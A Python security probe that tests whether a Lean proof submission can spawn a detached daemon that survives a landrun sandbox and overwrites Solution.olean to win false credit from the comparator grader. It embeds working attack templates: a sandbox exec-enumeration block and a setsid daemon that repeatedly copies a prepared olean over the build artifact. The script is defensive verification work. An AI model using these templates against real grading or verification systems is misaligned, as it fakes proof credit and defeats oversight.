#!/usr/bin/env python3
"""
Investigate whether a `Submission.lean` initialize block can spawn a
detached background process that survives comparator's per-build landrun
invocation and races to overwrite `Solution.olean` between
`safeLakeBuild Solution` and `safeExport solutionModule`.

If the answer is "yes", we have a confirmed false-credit attack that
requires no sandbox escape. The attacker's submission would:

  1. Spawn a daemon during Submission's elaboration. Daemon inherits
     landrun's filesystem rules (which permit writes under `.lake/`).
  2. Daemon detaches via setsid + double-fork, surviving the parent
     `lake build Solution` exit (and thus surviving comparator's
     landrun child).
  3. Daemon races to overwrite `.lake/build/lib/Solution.olean` with a
     pre-prepared olean whose theorem statement matches Challenge but
     whose proof is `True.intro` (or other trivially-true content).
  4. Comparator's `safeExport solutionModule` then exports the
     attacker's olean rather than the legitimate one. `verifyMatch`
     succeeds because the statement type matches Challenge.

Codex flagged this attack class in the second-opinion pass. SECURITY.md
must explicitly cite the result of this probe.

Phases:

  --phase=A   Establish whether landrun children survive parent exit.
              Spawns a heartbeat daemon, runs comparator end-to-end,
              checks if the heartbeat keeps growing afterwards.

  --phase=B   Actually try the race. Fails LOUDLY if comparator
              accepts a tampered Solution.olean.

  --phase=both (default) Run A then B, report both.

This probe does NOT have a CI mode that asserts "no exploit" by default,
because Phase B's outcome may motivate landing an upstream comparator
patch (setsid + killpg around landrun, or copy-out olean before
export). Once that mitigation is in place, add a CI assertion that
Phase B reports REJECTED.
"""

from __future__ import annotations

import argparse
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import time

REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent.parent
TOOLCHAIN = (REPO_ROOT / "lean-toolchain").read_text(encoding="utf-8").strip()


# ---- Phase A: process-tree behaviour ----

PHASE_A_SUBMISSION = r"""
import Lean

private def tryExec (label cmd : String) (args : Array String) : IO String := do
  try
    let child ← IO.Process.spawn {
      cmd, args, stdin := .null, stdout := .null, stderr := .null
    }
    let code ← child.wait
    return s!"{label} {cmd}: spawn ok, exit={code}"
  catch e =>
    return s!"{label} {cmd}: spawn FAIL :: {e.toString.take 160}"

initialize do
  let cwd ← IO.currentDir
  let outDir : System.FilePath := cwd / ".lake" / "probe"
  IO.FS.createDirAll outDir
  -- Marker A: write synchronously from within elaboration.
  IO.FS.writeFile (outDir / "marker-elab") "init-ran\n"
  -- Probe what binaries the sandbox allows us to exec. If only `lean`
  -- and `git` work, an attacker's Submission has no way to spawn a
  -- daemon — the writable-.lake race attack collapses at the exec
  -- step.
  let results := #[
    (← tryExec "want_ok"   "lean"   #["--version"]),
    (← tryExec "want_ok"   "git"    #["--version"]),
    (← tryExec "want_deny" "sh"     #["-c", "true"]),
    (← tryExec "want_deny" "setsid" #["true"]),
    (← tryExec "want_deny" "cp"     #["--version"]),
    (← tryExec "want_deny" "bash"   #["-c", "true"]),
    (← tryExec "want_deny" "/bin/sh"          #["-c", "true"]),
    (← tryExec "want_deny" "/usr/bin/env"     #["-i"]),
  ]
  IO.FS.writeFile (outDir / "exec-results.txt")
    ((String.intercalate "\n" results.toList) ++ "\n")
  -- Heartbeat: only meaningful if `setsid`/`sh` happen to be allowed.
  -- If they're denied (which is what we expect), this spawn fails the
  -- same way and the heartbeat file stays absent — confirming the
  -- attack class is not exploitable as a side effect.
  try
    let _ ← IO.Process.spawn {
      cmd := "setsid"
      args := #[
        "sh", "-c",
        "for i in 1 2 3 4 5 6 7 8 9 10; do echo $i >> .lake/probe/heartbeat; sleep 1; done"
      ]
      stdin := .null, stdout := .null, stderr := .null
    }
    pure ()
  catch _ =>
    pure ()
  IO.println "Phase A: exec enumeration complete"
"""


# ---- Phase B: actual race attempt ----

# The "real" Solution will be overwritten by the daemon with a prepared
# olean. We can't easily synthesize a valid olean from Python, so the
# strategy is: produce a known-good olean ahead of time (in a sibling
# workspace) whose theorem has the same statement but a degenerate
# proof, and have the daemon `cp` that file over the legitimate one.

PHASE_B_SUBMISSION_TEMPLATE = r"""
import Lean

initialize do
  let cwd ← IO.currentDir
  let outDir : System.FilePath := cwd / ".lake" / "probe"
  IO.FS.createDirAll outDir
  -- Spawn a detached daemon that, after the parent `lake build`
  -- finishes, races to overwrite Solution.olean with the attacker's
  -- prepared version.
  let _ ← IO.Process.spawn {
    cmd := "setsid"
    args := #[
      "sh", "-c",
      -- 1. Wait until Solution.olean exists (lake just finished building it).
      -- 2. Then in a tight loop, overwrite it from the prepared copy.
      --    The race window is between safeLakeBuild returning and
      --    safeExport reading the olean (lean4export's stat/open).
      "( while [ ! -f .lake/build/lib/Solution.olean ]; do sleep 0.05; done; \
         while true; do cp -f __PREPARED_OLEAN__ .lake/build/lib/Solution.olean 2>/dev/null || true; sleep 0.01; done ) &"
    ]
    stdin  := .null
    stdout := .null
    stderr := .null
  }
  IO.println "Phase B: tamper daemon spawned"
"""


CHALLENGE_LEAN = """\
-- Probe-internal trivially-true theorem (statement-type-equal across
-- attacker's prepared olean).
theorem artifact_tamper_probe_thm : True := True.intro
"""

LEGITIMATE_SUBMISSION_THM = """\
namespace Submission
theorem artifact_tamper_probe_thm : True := True.intro
end Submission
"""

SOLUTION_LEAN = """\
import Submission
import Submission.Thm

theorem artifact_tamper_probe_thm : True := Submission.artifact_tamper_probe_thm
"""

LAKEFILE_TOML = """\
name = "artifact_tamper_probe"
defaultTargets = ["Challenge", "Solution", "Submission"]

[[lean_lib]]
name = "Challenge"

[[lean_lib]]
name = "Solution"

[[lean_lib]]
name = "Submission"
"""

CONFIG_JSON = {
    "challenge_module": "Challenge",
    "solution_module": "Solution",
    "theorem_names": ["artifact_tamper_probe_thm"],
    "permitted_axioms": ["propext", "Quot.sound", "Classical.choice"],
    "enable_nanoda": False,
}


class ProbeError(Exception):
    pass


def _check_tools(require: bool) -> list[str]:
    needed = ["lake", "lean", "landrun", "comparator", "setsid"]
    missing = [t for t in needed if shutil.which(t) is None]
    if missing and require:
        raise ProbeError(f"Missing tools: {', '.join(missing)}")
    return missing


def _write_common(workspace: pathlib.Path, *, submission_lean: str) -> None:
    (workspace / "lakefile.toml").write_text(LAKEFILE_TOML, encoding="utf-8")
    (workspace / "lean-toolchain").write_text(TOOLCHAIN + "\n", encoding="utf-8")
    (workspace / "Challenge.lean").write_text(CHALLENGE_LEAN, encoding="utf-8")
    (workspace / "Solution.lean").write_text(SOLUTION_LEAN, encoding="utf-8")
    (workspace / "Submission.lean").write_text(submission_lean, encoding="utf-8")
    sub = workspace / "Submission"
    sub.mkdir(parents=True, exist_ok=True)
    (sub / "Thm.lean").write_text(LEGITIMATE_SUBMISSION_THM, encoding="utf-8")
    (workspace / "config.json").write_text(
        json.dumps(CONFIG_JSON, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )


def _run(cmd: list[str], cwd: pathlib.Path, env=None, timeout=180) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        cmd, cwd=cwd, capture_output=True, text=True, check=False, timeout=timeout, env=env
    )


def _phase_a(tmp: pathlib.Path) -> tuple[bool, str]:
    """Returns (heartbeat_grew_after_comparator_exit, summary)."""
    workspace = tmp / "ws_a"
    workspace.mkdir(parents=True)
    _write_common(workspace, submission_lean=PHASE_A_SUBMISSION)
    _run(["lake", "update"], workspace)
    result = _run(["lake", "env", "comparator", "config.json"], workspace, timeout=300)
    probe_dir = workspace / ".lake" / "probe"
    elab_marker = probe_dir / "marker-elab"
    exec_results = probe_dir / "exec-results.txt"
    heartbeat = probe_dir / "heartbeat"
    if not elab_marker.is_file():
        sys.stderr.write(
            f"Phase A: init block did not run at all. comparator exit={result.returncode}\n"
            f"--- comparator stdout ---\n{result.stdout[-2000:]}\n"
        )
        return False, "Phase A: marker-elab missing — init block did not execute."
    exec_lines = exec_results.read_text(encoding="utf-8").strip() if exec_results.is_file() else "<missing>"
    diag = (
        "Phase A finding:\n"
        f"  init block ran:                    True\n"
        f"  long-running heartbeat detached:   "
        + (f"YES, {heartbeat.stat().st_size} bytes" if heartbeat.is_file() else "NO (spawn denied)")
        + "\n"
        f"  exec enumeration (from inside sandbox):\n    "
        + exec_lines.replace("\n", "\n    ")
    )
    if not heartbeat.is_file():
        # The daemon never landed. Likely cause: setsid/sh exec denied
        # by landrun. Confirm via exec-results.
        return False, diag
    size_immediately = heartbeat.stat().st_size
    # Wait a couple of ticks; if the daemon was killed with comparator,
    # size will be stable. If it survived, size grows.
    time.sleep(3)
    size_after = heartbeat.stat().st_size
    grew = size_after > size_immediately
    summary = (
        f"Phase A: heartbeat size at comparator exit = {size_immediately}, "
        f"after +3s = {size_after}. "
        + ("DAEMON SURVIVED comparator exit." if grew else "Daemon did not survive (killed cleanly).")
        + f" Comparator exit code: {result.returncode}."
    )
    return grew, summary


def _build_prepared_olean(tmp: pathlib.Path) -> pathlib.Path | None:
    """Build a Solution.olean in a sibling workspace and return its path.

    The prepared olean is byte-substitutable for the legitimate
    Solution.olean iff Lean's olean format permits it. If lean4export
    later refuses to parse the substituted file, Phase B reports
    'rejected (lean4export refused tampered olean)'.
    """
    prep = tmp / "prep"
    prep.mkdir()
    _write_common(prep, submission_lean="-- intentionally inert\n")
    # Build it once (no comparator needed); just want the .olean.
    _run(["lake", "update"], prep)
    r = _run(["lake", "build", "Solution"], prep, timeout=300)
    olean = prep / ".lake" / "build" / "lib" / "Solution.olean"
    if r.returncode != 0 or not olean.is_file():
        sys.stderr.write(
            "Phase B prep: failed to build a legitimate prepared Solution.olean. "
            "Comparator-side mitigation may make Phase B inconclusive.\n"
        )
        if r.stderr:
            sys.stderr.write(r.stderr[-2000:])
        return None
    return olean


def _phase_b(tmp: pathlib.Path) -> tuple[str, str]:
    """Returns (verdict, summary). verdict in {ACCEPTED, REJECTED, INCONCLUSIVE}."""
    prepared = _build_prepared_olean(tmp)
    if prepared is None:
        return "INCONCLUSIVE", "Phase B: could not build prepared olean (see stderr)."
    workspace = tmp / "ws_b"
    workspace.mkdir(parents=True)
    submission_lean = PHASE_B_SUBMISSION_TEMPLATE.replace(
        "__PREPARED_OLEAN__", str(prepared)
    )
    _write_common(workspace, submission_lean=submission_lean)
    _run(["lake", "update"], workspace)
    r = _run(["lake", "env", "comparator", "config.json"], workspace, timeout=300)
    output = (r.stdout or "") + (r.stderr or "")
    if r.returncode == 0 and "Your solution is okay" in output:
        # In our setup the legitimate proof IS valid, so a clean accept
        # could mean either "tamper had no effect" OR "tamper succeeded
        # but produced a still-valid olean" — we cannot distinguish
        # from exit code alone. Look at the heartbeat file to confirm
        # the daemon ran, and at the legitimate olean to see if it was
        # rewritten (mtime changed during the comparator run).
        olean = workspace / ".lake" / "build" / "lib" / "Solution.olean"
        legit_size = (workspace / ".lake" / "build" / "lib" / "Submission.olean").stat().st_size if (workspace / ".lake" / "build" / "lib" / "Submission.olean").is_file() else None
        verdict = (
            "ACCEPTED"
            if (olean.is_file() and prepared.stat().st_size == olean.stat().st_size)
            else "ACCEPTED (no detectable tamper)"
        )
        return verdict, (
            f"Phase B: comparator exited 0. Solution.olean size = "
            f"{olean.stat().st_size if olean.is_file() else '<missing>'}, "
            f"prepared.olean size = {prepared.stat().st_size}. "
            "If sizes match exactly, the daemon's overwrite landed AND comparator did not detect it. "
            "Inspect mtimes / hashes manually to confirm the attack."
        )
    return "REJECTED", (
        f"Phase B: comparator exited {r.returncode}. "
        "Either the daemon was killed before tamper landed, or comparator "
        "detected the rewrite. Tail of comparator output:\n"
        + output[-1500:]
    )


def run_probe(*, phase: str, require_tools: bool) -> int:
    missing = _check_tools(require=require_tools)
    if missing and not require_tools:
        print(
            f"artifact_tamper_probe: skipped (missing tools: {', '.join(missing)})",
            file=sys.stderr,
        )
        return 0
    with tempfile.TemporaryDirectory(prefix="artifact_tamper_probe_") as raw_tmp:
        tmp = pathlib.Path(raw_tmp)
        nonzero = 0
        if phase in ("A", "both"):
            grew, summary = _phase_a(tmp)
            print(summary)
            if grew:
                print(
                    "  >> Attack surface CONFIRMED: detached children survive landrun.",
                    "  >> See SECURITY.md > 'Where untrusted code runs' for the mitigation status.",
                    sep="\n",
                )
                nonzero = 1
        if phase in ("B", "both"):
            verdict, summary = _phase_b(tmp)
            print(summary)
            if verdict.startswith("ACCEPTED"):
                print(
                    "  >>>> CONFIRMED FALSE-CREDIT ATTACK <<<<",
                    "  >> comparator accepted a Solution.olean that was rewritten by",
                    "  >> a Submission-spawned daemon AFTER `safeLakeBuild` returned.",
                    "  >> Mitigation: see SECURITY.md > 'Where untrusted code runs' >",
                    "  >> 'Writable-.lake self-tampering'. Likely upstream comparator patch.",
                    sep="\n",
                )
                return 3
            if verdict == "INCONCLUSIVE":
                nonzero = max(nonzero, 1)
    return nonzero


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--phase", choices=("A", "B", "both"), default="both")
    parser.add_argument("--require-tools", action="store_true")
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    try:
        return run_probe(phase=args.phase, require_tools=args.require_tools)
    except ProbeError as exc:
        print(f"artifact_tamper_probe: error\n  {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
